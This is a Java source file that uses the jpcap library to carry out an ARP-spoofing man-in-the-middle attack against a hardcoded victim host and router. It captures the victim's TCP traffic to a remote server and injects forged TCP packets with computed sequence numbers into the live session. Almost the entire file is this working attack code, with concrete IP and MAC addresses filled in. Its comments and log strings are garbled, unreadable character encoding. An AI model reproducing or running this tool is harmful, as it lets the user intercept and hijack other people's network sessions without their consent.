package Manager;


import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import Factory.ARPFactory;
import Model.Model_Capture;
import Model.Model_a;
import Model.TestPacketReceiver;
import Util.SetPacket.SetARP;
import Util.SetPacket.SetTCP;

public class Manager_cheatServiceAndHost {
	
	static Model_Capture cpmodel = new Model_Capture();
	static List<TCPPacket> cpmodels = new ArrayList<TCPPacket>();
	
	//��3��LIST����װҪ���͵İ� ARP  TCPtohost  TCPtoservice
	
	static List<ARPPacket> ARPs = new ArrayList<ARPPacket>();
	static List<TCPPacket> TCPtohosts = new ArrayList<TCPPacket>();
	static List<TCPPacket> TCPtoservices = new ArrayList<TCPPacket>();
	
	final BlockingQueue<Packet> sendQueue = new ArrayBlockingQueue<Packet>(10);
	static Object flag = new Object(); 
	
	
	//�����ļ�
	static int ARP_INTERVAL;
	
	{
		readProperties();
		
	}
		
	public static void main(String[] args) {
		
		//��ȡ�������ݰ�������
		JpcapSender js = getCrad(0);
		//Manager_cheatServiceAndHost mc= new Manager_cheatServiceAndHost();
		
		/*************************************************
		 * α��ARP���ݣ���ӵ��������б���
		 *************************************************/                                                       
		setARPs("192.168.8.100","192.168.8.1","60:d8:19:4a:b2:fc",null,null);
		/************************************************* 
		 * ���������̣߳���鷢���б���Ҫ��ͣ�ķ���
		 *************************************************/
		sentThread(js);
		
		/*************************************************
		 * ARP��ƭ�ɹ��󣬿�ʼ�����������͵����ݷ��뵽cpmodel��,
		 * ���Ҽ����α�����ݼ��뵽�����б�
		 *************************************************/
		capPacket_run(0,"192.168.8.100","119.29.42.117");
		
		
		/*************************************************
		 * ѡ��ģʽ������α���̣߳���ʼα������,����ӵ��������б�
		 * ģʽһ��ֻת������
		 * ģʽ�������������ͷ����������ݣ����ҷ���α����������ͨ��
		 *************************************************/
		fakeThread(2,"60:d8:19:4a:b2:fc");
		
	}
	
	
	/*************************************************
	 * ��������
	 *************************************************/
	public void start(){
		
		//��ȡ�������ݰ�������
				JpcapSender js = getCrad(0);
				
				/*************************************************
				 * α��ARP���ݣ���ӵ��������б���
				 *************************************************/
				setARPs("192.168.8.100","192.168.8.1","60:d8:19:4a:b2:fc","AC:CF:23:87:BD:2E","E4:D3:32:E0:7B:82");
				
				
				/************************************************* 
				 * ���������̣߳���鷢���б���Ҫ��ͣ�ķ���
				 *************************************************/
				sentThread(js);
				
				/*************************************************
				 * ARP��ƭ�ɹ��󣬿�ʼ�����������͵����ݷ��뵽cpmodel��,
				 * ���Ҽ����α�����ݼ��뵽�����б�
				 *************************************************/
				capPacket_run(0,"192.168.8.100","119.29.42.117");
				
				/*************************************************
				 * ѡ��ģʽ������α���̣߳���ʼα������,����ӵ��������б�
				 * ģʽһ��ֻת������
				 * ģʽ�������������ͷ����������ݣ����ҷ���α����������ͨ��
				 *************************************************/
				fakeThread(2,"60:d8:19:4a:b2:fc");	
	}
	
	
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * ץ���̵߳�һ��������������ţ�����������IP�ͷ�����IP
	 *************************************************/
	public static void capPacket_run(int i,String host_ip, String service_ip){
	    
	       try{    
	            //��ȡ�����ϵ�����ӿڶ�������    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //����ĳ�������ϵ�ץȡ����,�������һ����ץ����СΪ2000byte
	        JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        startCapThread(jpcap,host_ip,service_ip);    
	        System.out.println("��ʼץȡ��"+i+"�������ϵ�����");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("����ʧ��:  "+ef);    
	        }      
	   }
	    //��Captor�ŵ������߳�������    
	   public static void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip ){    
	       //JpcapCaptor jp=jpcap;    
	       java.lang.Runnable rnner=new Runnable(){      

			public void run(){    
	               //ʹ�ýӰ�������ѭ��ץ��-1��ʾ�����Ƶ�ץȡ���ݰ�   "192.168.8.101","119.29.42.117"
				
				//�Ƿ�Ž�ѭ���ڲ�
				TestPacketReceiver pr = new TestPacketReceiver(host_ip,"E4:D3:32:E0:7B:82");
				
	        	   while(true){	    
	        		  jpcap.loopPacket(1, pr);
	        		  
	        		  //�õ�ץȡ���ģ�ָ����TCPmodel ��Ҫ��model�е����ݽ��з����ͼ��㲢�ҰѼ�������ݷ��س��߳�
	        		  if(pr.getModel() != null){
	        			  
	        			  if(pr.getModel().getFlag().equals("syn")){
	        				  
	        				  System.out.println("����֡......����cpmodelʧ��");
	        				  continue;
	        			  }
	        			  
	        			  
	        			  //��סcapmodel
	        			  synchronized (flag) {
	        				  
	        				  
	        				  if(cpmodel.getAcknum() == 0){
		        				  
		        				  cpmodel =  pr.getModel();	
		        				  System.out.println("cpmodel��ʼ��");
		        				  
		        				  
			        				  flag.notifyAll();
			        				  	//System.out.println("��α���߳�......");
			        				 try {
			        					  //this?
			        					System.out.println("��ͣץ���߳�......");
										flag.wait();		
									} catch (InterruptedException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
		  
		        			  }  
		        			  //��֮ǰ�Ĳ�ͬ����ӽ�ȥ
		        			  else if(cpmodel.getAcknum() != 0 && !cpmodel.issame(pr.getModel())){	  
	        					  cpmodel =  pr.getModel();	
	        					  System.out.println("cpmodel����");
		        						flag.notifyAll();  
			        				 try {
			        					  //this?
			        					System.out.println("��ͣץ���߳�......");
										flag.wait();
										
									} catch (InterruptedException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
		        				  
		        			  }
	
						}	
	        		  } 
	        	   }    
	           }    
	       }; 
	       

			Thread capThread = new Thread(rnner);
			capThread.start();
	      // new Thread(rnner).start();//����ץ���߳�    
	       System.out.println("ץ���߳�����");
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	  
	   
	   
	 /*************************************************
	 * �����߳�
	 *************************************************/
	   public static void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						
						//��ͣ�ķ���
						while(true){
							if(js != null){
								//���LIST��Ϊ�գ��ͷ���LIST����ı���
								if(ARPs.size()!= 0){
									
									for(int i= 0 ;i<ARPs.size();i++){	
										js.sendPacket(ARPs.get(i));
										System.out.println("sending arp.."); 
									}	
								}
								
								synchronized (TCPtohosts) {
									if(TCPtohosts.size()!= 0){
										for(int i= 0 ;i<TCPtohosts.size();i++){	
											js.sendPacket(TCPtohosts.get(i));
										System.out.println("sending TCPtohost.."+"seq|"+TCPtohosts.get(i).sequence+" ack|"+TCPtohosts.get(i).ack_num); 
										}	
										
										//�������֮����գ�ֻ����һ��
										TCPtohosts.clear();
									}
								}
								
								
								synchronized (TCPtoservices) {
									if(TCPtoservices.size()!= 0){
										for(int i= 0 ;i<TCPtoservices.size();i++){	
											js.sendPacket(TCPtoservices.get(i));
											System.out.println("sending TCPtohost.."+"seq|"+TCPtoservices.get(i).sequence+" ack|"+TCPtoservices.get(i).ack_num);
										}
										TCPtoservices.clear();
									}
									
								}
							}
							//this.wait(10000);
							Thread.sleep(7000);
						}
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			
			//new Thread(runner).start();
		   System.out.println("�����߳�����");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs����
	 *************************************************/
	   public  static void setARPs(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC){
		   SetARP sa = new SetARP();
		   
		  ARPPacket arp1 =  sa.fakeARP(hostIP,routeIP,deviceMAC,yourMAC);
		  ARPPacket arp2 =  sa.fakeARP(routeIP,hostIP,routeMAC,yourMAC);
		  
		  ARPs.add(arp1);
		  ARPs.add(arp2); 
		  
		   /*ARPFactory arpFactory = null;
		   if(routeMAC == null){
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC);
		   }else{
			   
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC, routeMAC);
		   }
		  
		   final ARPFactory arpFactory1 = arpFactory;
		  Runnable run = new Runnable() {
			
			@Override
			public void run() {
				while(true){
					
					Set<ARPPacket> ARPs = arpFactory1.getInstance();
					Iterator<ARPPacket> it = ARPs.iterator();
					//��arp���뷢�Ͷ���
					while(it.hasNext()){
						try {
							sendQueue.put(it.next());
						} catch (InterruptedException e) {
							e.printStackTrace();
						}	
					}
					//ÿ����һ��ֹͣ����
					try {
						Thread.sleep(ARP_INTERVAL);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		  };
		  
		  
		  new Thread(run).start();*/
		  
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	  /*************************************************
	 * α�����ݰ��߳�,��Ϊ����ģʽ
	 *************************************************/
	  public static void fakeThread(int flags,final String  yourMAC){
		   
		   //ģʽһΪֱ��ת�����յ�������

		   //ģʽ2Ϊ���ضԷ�����,ת���Լ�α�������
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					  // System.out.println("���뵽α���߳�1");
					   int step = 0;
					  while(true){
						  
						  //ͬ����
						  synchronized (flag) {	
							  
							  try {
								  System.out.println("α���̵߳ȴ���......");
								  flag.wait();
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
							
						 // }
						  	  	
						    
						  if(cpmodel != null){
							   //synchronized (cpmodel) {
								 //�����α������ݰ�,����һ��TCPpcaket
							  System.out.println("��ʼα�����ݰ�......");
							  
							  if(!cpmodel.isTransation()){
								  
								  TCPPacket fakeTCP = fakeTCP(cpmodel,yourMAC,step);
								   
								   if(fakeTCP != null){ 
									   //��ס����װTCP��list
									   synchronized (TCPtohosts) {	   
										TCPtohosts.add(fakeTCP);
										System.out.println("����������б�......");
										//cpmodels.add(fakeTCP);
											step++;
									  }   
								   }
								  
							  }else{
								  
								  TCPPacket fakeTCP = fakeTCP(cpmodel,yourMAC,step);
								   
								   if(fakeTCP != null){ 
									   //��ס����װTCP��list
									   synchronized (TCPtoservices) {	   
										TCPtoservices.add(fakeTCP);
										System.out.println("����������б�......");
										//cpmodels.add(fakeTCP);
											step++;
									  }   
								   }
								  
								  
							  }	
							//}  
								   //��������ץ�� 
									  try {
										 System.out.println("���´�ץ���߳�......");
										  flag.notify();;
									} catch (Exception e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}  	   
						  } 

						}  
					 }
					
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.setPriority(7);
			   fakeThread.start();
		   //}
		    
	   }
	   /*************************************************
	 * end
	 *************************************************/
	   
	   
	   
	   /*************************************************
	 * ����α�����Ҫ���͵�TCP֡
	 *************************************************/
	   public static TCPPacket fakeTCP(Model_Capture cpmodel,String  yourMAC,int step){
		  
		   
		   //���õ�Ҫα������ݶ�
		   Manager_airdump ma = new Manager_airdump();
		   
		   
		   SetTCP st = new SetTCP();
		   TCPPacket tcp = null;
		   
		   //��������������
		   if(!cpmodel.isTransation()){
			   
			   //������Ҫα���������α��Ϊ����������������
			   //�ȼ����seq ack
			   
			   long seq = 0;
			   long ack = 0;
			   
			   
			   
			   if(cpmodel.getFlag().equals("syn")){
				   
				   
				   
			   }
			   else if(cpmodel.getFlag().equals("ack")){
				   
				     
					   seq = cpmodel.getAcknum();
					   ack = cpmodel.getSeqnum();    
				   
				  
				   
			   }
			   else if(cpmodel.getFlag().equals("ack/push")){
				   
				   
				   //����SEQ��ACK
				   seq = cpmodel.getAcknum();
				   ack = cpmodel.getSeqnum() + cpmodel.getDataLen();	  
			 }   
			   
			   Model_a model = null;
			   if(seq != 0){
				   
				   int index = step;
				   if(index <3){
					   if(index == 2)
						   index++;   
					    model= ma.run("1122.pcap","192.168.8.100").get(index);
					    
					    tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
				    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
				    			 yourMAC, "AC:CF:23:87:BD:2E", model);
		System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
					    
				   }
				   
				   else {
					   index = 3;
					   //model= ma.run("1122.pcap","192.168.8.100").get(index);
					   
					   tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
				    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
				    			 yourMAC, "AC:CF:23:87:BD:2E", null);
		System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+" ack|"+tcp.ack); 
					   
				   }
				  	   
			   }
			  
		   }
		   
		   //��������������
		   /*else if(cpmodel.isTransation()){
			   
			   
			   long seq = 0;
			   long ack = 0;
			   
			   
			   
			   if(cpmodel.getFlag().equals("syn")){
				   
				   
				   
			   }
			   else if(cpmodel.getFlag().equals("ack")){
				   
				     
					   seq = cpmodel.getAcknum();
					   ack = cpmodel.getSeqnum();    
				   
				  
				   
			   }
			   else if(cpmodel.getFlag().equals("ack/push")){
				   
				   
				   //����SEQ��ACK
				   seq = cpmodel.getAcknum();
				   ack = cpmodel.getSeqnum() + cpmodel.getDataLen();	  
			 }   
			   
			   //��������ʹ��һ�������ھ�ֹ״̬�µ��������ݣ�������....
			   Model_a model = null;
			   
			   
			   tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
		    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
		    			 yourMAC, "AC:CF:23:87:BD:2E", model);
System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
			   
			   
		   }*/
		   
		  return tcp; 
	   } 
	   
	   /*************************************************
	 * end
	 *************************************************/


		
		 /*************************************************
			 * ��ȡ�����������ݵ�����
			 *************************************************/
		public static JpcapSender getCrad(int deviceNum){
				  
					NetworkInterface[] devices = null;
					
					 try{    
						 //��ȡ�����ϵ�����ӿڶ�������    
						  devices = JpcapCaptor.getDeviceList();
		System.out.println("������ȡ�ɹ�  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
			System.out.println("��ʾ����ӿ�����ʧ��:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
		System.out.println("�ѻ�ȡ����(����ʹ��)  "+deviceNum+"  JSender�����ɹ�");  				
					} catch (IOException e1) {
			System.out.println("JSender�������ɹ�");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
		
		
		
		
		/*************************************************
		 * ��ȡ�����ļ�prameter.properties
		 *************************************************/
		  public void readProperties(){
			  	
				Properties prop = new Properties();
				InputStream in = Object. class .getResourceAsStream( "/prameter.properties" );    
		        try  {    
		           prop.load(in);    
		           ARP_INTERVAL = Integer.parseInt(prop.getProperty( "ARP_INTERVAL" ).trim());    
		       }  catch  (IOException e) {    
		           e.printStackTrace();    
		       }  
		         
		        
		        /*
		        File fileB = new File( this.getClass().getResource( "" ).getPath());  
		        
		        System. out .println( "fileB path: " + fileB);*/  
		  }
		  /*************************************************
		 * end
		 *************************************************/
}    